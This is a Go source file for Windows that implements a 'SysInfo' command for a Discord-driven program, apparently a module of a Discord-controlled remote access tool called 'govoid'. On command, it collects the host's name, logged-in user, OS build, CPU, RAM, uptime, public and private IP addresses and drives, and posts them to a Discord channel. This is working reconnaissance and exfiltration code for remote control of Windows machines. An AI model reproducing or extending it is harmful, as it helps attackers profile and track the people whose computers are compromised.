//go:build windows

package commands

import (
	"context"
	"fmt"
	"net"
	"os"
	"os/user"
	"runtime"
	"strings"
	"time"
	"unsafe"

	"github.com/bwmarrin/discordgo"
	"github.com/local/govoid/internal/util"
	"golang.org/x/sys/windows"
	"golang.org/x/sys/windows/registry"
)

var (
	kernel32Local           = windows.NewLazySystemDLL("kernel32.dll")
	procGlobalMemoryStatus  = kernel32Local.NewProc("GlobalMemoryStatusEx")
	procGetTickCount64      = kernel32Local.NewProc("GetTickCount64")
	procGetLogicalDrives    = kernel32Local.NewProc("GetLogicalDrives")
	procGetDiskFreeSpaceExW = kernel32Local.NewProc("GetDiskFreeSpaceExW")
	procGetDriveTypeW       = kernel32Local.NewProc("GetDriveTypeW")
)

type memoryStatusEx struct {
	Length               uint32
	MemoryLoad           uint32
	TotalPhys            uint64
	AvailPhys            uint64
	TotalPageFile        uint64
	AvailPageFile        uint64
	TotalVirtual         uint64
	AvailVirtual         uint64
	AvailExtendedVirtual uint64
}

func SysInfo(s *discordgo.Session, i *discordgo.InteractionCreate) {
	if err := Defer(s, i); err != nil {
		return
	}

	host, err := os.Hostname()
	if err != nil || host == "" {
		host = os.Getenv("COMPUTERNAME")
	}
	if host == "" {
		host = "desconocido"
	}

	username := "desconocido"
	if current, err := user.Current(); err == nil {
		username = current.Username
	}

	totalRAM, loadPct := memoryInfo()
	disks := diskList()
	uptime := uptimeString()

	fields := []*discordgo.MessageEmbedField{
		{Name: "🖥 Hostname", Value: host, Inline: true},
		{Name: "👤 Usuario", Value: username, Inline: true},
		{Name: "🧩 OS", Value: windowsVersion(), Inline: false},
		{Name: "⚙️ CPU", Value: cpuName(), Inline: false},
		{Name: "🧠 RAM", Value: fmt.Sprintf("%.1f GB — uso %d%%", totalRAM, loadPct), Inline: true},
		{Name: "⏱ Uptime", Value: uptime, Inline: true},
		{Name: "🌐 IP pública", Value: util.PublicIP(context.Background()), Inline: true},
		{Name: "🏠 IP privada", Value: privateIP(), Inline: true},
		{Name: "💾 Discos", Value: truncate(disks, 1000), Inline: false},
		{Name: "📡 Arquitectura", Value: runtime.GOOS + "/" + runtime.GOARCH, Inline: true},
	}

	embed := &discordgo.MessageEmbed{
		Title:     "💻 System Information",
		Color:     3447003,
		Fields:    fields,
		Timestamp: nowTimestamp(),
	}
	FinishEmbed(s, i, embed)
}

func memoryInfo() (float64, uint32) {
	var status memoryStatusEx
	status.Length = uint32(unsafe.Sizeof(status))
	res, _, _ := procGlobalMemoryStatus.Call(uintptr(unsafe.Pointer(&status)))
	if res == 0 {
		return 0, 0
	}
	return float64(status.TotalPhys) / (1024 * 1024 * 1024), status.MemoryLoad
}

func uptimeString() string {
	ms, _, _ := procGetTickCount64.Call()
	if ms == 0 {
		return "desconocido"
	}
	d := time.Duration(ms) * time.Millisecond
	days := int(d.Hours()) / 24
	hours := int(d.Hours()) % 24
	minutes := int(d.Minutes()) % 60
	return fmt.Sprintf("%dd %dh %dm", days, hours, minutes)
}

func diskList() string {
	mask, _, _ := procGetLogicalDrives.Call()
	var builder strings.Builder
	for index := 0; index < 26; index++ {
		if mask&(1<<uint(index)) == 0 {
			continue
		}
		root := string(rune('A'+index)) + ":\\"
		rootPtr, err := windows.UTF16PtrFromString(root)
		if err != nil {
			continue
		}
		driveType, _, _ := procGetDriveTypeW.Call(uintptr(unsafe.Pointer(rootPtr)))
		if driveType != 2 && driveType != 3 {
			continue
		}
		var freeAvailable, total, totalFree uint64
		res, _, _ := procGetDiskFreeSpaceExW.Call(
			uintptr(unsafe.Pointer(rootPtr)),
			uintptr(unsafe.Pointer(&freeAvailable)),
			uintptr(unsafe.Pointer(&total)),
			uintptr(unsafe.Pointer(&totalFree)),
		)
		if res == 0 {
			continue
		}
		fmt.Fprintf(&builder, "%s %.1f/%.1f GB libres\n", root,
			float64(totalFree)/(1024*1024*1024),
			float64(total)/(1024*1024*1024))
	}
	if builder.Len() == 0 {
		return "sin discos accesibles"
	}
	return strings.TrimRight(builder.String(), "\n")
}

func windowsVersion() string {
	key, err := registry.OpenKey(registry.LOCAL_MACHINE,
		`SOFTWARE\Microsoft\Windows NT\CurrentVersion`, registry.QUERY_VALUE)
	if err != nil {
		return runtime.GOOS + "/" + runtime.GOARCH
	}
	defer func() {
		if cerr := key.Close(); cerr != nil {
			_ = cerr
		}
	}()

	product, _, productErr := key.GetStringValue("ProductName")
	display, _, displayErr := key.GetStringValue("DisplayVersion")
	build, _, buildErr := key.GetStringValue("CurrentBuild")

	if productErr != nil {
		product = "Windows"
	}
	if displayErr != nil {
		display = "?"
	}
	if buildErr != nil {
		build = "?"
	}
	return fmt.Sprintf("%s %s (build %s) %s/%s", product, display, build, runtime.GOOS, runtime.GOARCH)
}

func cpuName() string {
	key, err := registry.OpenKey(registry.LOCAL_MACHINE,
		`HARDWARE\DESCRIPTION\System\CentralProcessor\0`, registry.QUERY_VALUE)
	if err != nil {
		return "desconocido"
	}
	defer func() {
		if cerr := key.Close(); cerr != nil {
			_ = cerr
		}
	}()

	name, _, err := key.GetStringValue("ProcessorNameString")
	if err != nil {
		return "desconocido"
	}
	return strings.TrimSpace(name)
}

func privateIP() string {
	addrs, err := net.InterfaceAddrs()
	if err != nil {
		return "desconocida"
	}
	for _, addr := range addrs {
		ipnet, ok := addr.(*net.IPNet)
		if !ok || ipnet.IP.IsLoopback() {
			continue
		}
		if ip4 := ipnet.IP.To4(); ip4 != nil {
			return ip4.String()
		}
	}
	return "desconocida"
}
